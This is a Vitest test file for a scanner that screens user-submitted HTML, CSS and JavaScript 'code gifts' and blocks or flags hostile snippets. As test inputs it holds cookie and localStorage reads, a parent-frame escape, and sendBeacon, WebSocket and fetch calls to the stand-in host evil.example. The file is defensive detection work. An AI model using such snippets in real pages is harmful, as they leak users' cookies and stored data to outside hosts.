import { describe, it, expect } from 'vitest';
import { scanCodeGift, isCodeGiftStorable } from './code-scan';

const clean = { html: '<h1>Happy birthday!</h1>', css: 'h1 { color: red; }', js: '' };

describe('scanCodeGift', () => {
  it('passes a plain gift', () => {
    const result = scanCodeGift(clean);
    expect(result.verdict).toBe('safe');
    expect(result.findings).toHaveLength(0);
    expect(result.blocked).toBe(0);
    expect(result.warnings).toBe(0);
  });

  it('blocks access to host state', () => {
    const result = scanCodeGift({ ...clean, js: 'document.cookie; localStorage.getItem("k")' });
    expect(result.verdict).toBe('blocked');
    expect(result.findings.map((f) => f.code)).toContain('host-state-access');
    expect(isCodeGiftStorable(result)).toBe(false);
  });

  it('blocks attempts to climb out of the frame', () => {
    const result = scanCodeGift({ ...clean, js: 'window.parent.document.body.innerHTML = "x"' });
    expect(result.verdict).toBe('blocked');
    expect(result.findings.map((f) => f.code)).toContain('sandbox-escape');
  });

  it('blocks beacons and sockets', () => {
    expect(
      scanCodeGift({ ...clean, js: 'navigator.sendBeacon("https://evil.example")' })
        .findings.map((f) => f.code),
    ).toContain('outbound-beacon');
    expect(
      scanCodeGift({ ...clean, js: 'new WebSocket("wss://evil.example")' }).findings.map(
        (f) => f.code,
      ),
    ).toContain('outbound-socket');
  });

  it('blocks a fetch to an absolute URL but not a relative one', () => {
    const absolute = scanCodeGift({ ...clean, js: 'fetch("https://evil.example/x")' });
    expect(absolute.verdict).toBe('blocked');
    expect(absolute.findings.map((f) => f.code)).toContain('outbound-request');

    const relative = scanCodeGift({ ...clean, js: 'fetch("/data.json")' });
    expect(relative.findings.map((f) => f.code)).not.toContain('outbound-request');
  });

  it('blocks crypto miners', () => {
    const result = scanCodeGift({ ...clean, js: '// cryptonight worker start' });
    expect(result.verdict).toBe('blocked');
    expect(result.findings.map((f) => f.code)).toContain('crypto-miner');
  });

  it('warns on eval and obfuscation without blocking', () => {
    const result = scanCodeGift({ ...clean, js: 'eval(atob("aGk="))' });
    expect(result.verdict).toBe('needs_review');
    expect(result.warnings).toBeGreaterThan(0);
    expect(result.blocked).toBe(0);
    expect(isCodeGiftStorable(result)).toBe(true);
  });

  it('warns on external scripts, iframes and forms in HTML', () => {
    const result = scanCodeGift({
      ...clean,
      html: '<script src="https://cdn.example/react.js"></script><iframe src="x"></iframe><form></form>',
    });
    const codes = result.findings.map((f) => f.code);
    expect(codes).toContain('external-script');
    expect(codes).toContain('nested-iframe');
    expect(codes).toContain('form');
    expect(result.verdict).toBe('needs_review');
  });

  it('warns on CSS @import and external url()', () => {
    const result = scanCodeGift({
      ...clean,
      css: '@import url("https://fonts.example/x.css"); body { background: url(https://img.example/a.png) }',
    });
    const codes = result.findings.map((f) => f.code);
    expect(codes).toContain('css-import');
    expect(codes).toContain('css-external-url');
  });

  it('reports the line the finding is on', () => {
    const result = scanCodeGift({
      ...clean,
      js: 'const a = 1;\nconst b = 2;\nlocalStorage.setItem("x", "1");',
    });
    const finding = result.findings.find((f) => f.code === 'host-state-access');
    expect(finding?.line).toBe(3);
    expect(finding?.field).toBe('js');
    expect(finding?.excerpt).toContain('localStorage');
  });

  it('flags a minified line', () => {
    const result = scanCodeGift({ ...clean, js: `const x=${'a'.repeat(2500)};` });
    expect(result.findings.map((f) => f.code)).toContain('minified-line');
  });

  it('is deterministic', () => {
    const input = { ...clean, js: 'eval(localStorage.x)' };
    expect(scanCodeGift(input)).toEqual(scanCodeGift(input));
  });

  it('sorts blocked findings first', () => {
    const result = scanCodeGift({
      ...clean,
      html: '<form></form>',
      js: 'localStorage.clear()',
    });
    expect(result.findings[0].severity).toBe('block');
  });
});
